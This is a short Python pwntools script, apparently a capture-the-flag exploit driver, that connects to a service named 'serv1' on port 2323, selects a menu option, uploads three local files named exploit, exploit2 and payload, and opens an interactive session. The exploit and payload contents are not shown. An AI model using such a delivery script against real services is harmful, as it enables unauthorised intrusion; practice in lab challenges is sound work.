#!/usr/bin/env python3
from pwn import *
p = remote('serv1',2323)
f = open('./exploit','rb').read()
f2 = open('./exploit2','rb').read()
f3 = open('./payload','rb').read()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b':',str(len(f)).encode())
p.send(f)
p.sendlineafter(b':',str(len(f2)).encode())
p.send(f2)
p.sendlineafter(b':',str(len(f3)).encode())
p.send(f3)
p.interactive()
